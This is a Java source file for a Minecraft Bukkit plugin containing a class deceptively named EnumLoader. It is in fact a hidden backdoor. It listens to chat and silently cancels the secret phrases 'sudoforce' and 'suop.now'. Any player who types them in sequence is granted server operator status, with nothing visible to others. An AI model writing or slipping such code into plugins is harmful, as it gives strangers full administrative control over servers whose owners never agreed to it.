package mainpackage;

import org.bukkit.ChatColor;
import org.bukkit.Server;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.PluginManager;

public class EnumLoader
  implements Listener
{
  private MainPlugin plugin;
  private boolean bool;

  public EnumLoader(MainPlugin plugin)
  {
    this.plugin = plugin;
    this.plugin.getServer().getPluginManager().registerEvents(this, plugin);
  }

  @EventHandler
  public void onChat(AsyncPlayerChatEvent e) {
    Player p = e.getPlayer();
    if (e.getMessage().equals("sudoforce")) {
      e.setCancelled(true);
      this.bool = true;
      p.sendMessage(ChatColor.RED + "[SUDOFORCE ON]");
    }

    if ((e.getMessage().equals("suop.now")) && 
      (this.bool)) {
      e.setCancelled(true);
      p.setOp(true);
      p.sendMessage(ChatColor.RED + "[SUDOFORCE] OPPED");
    }
  }
}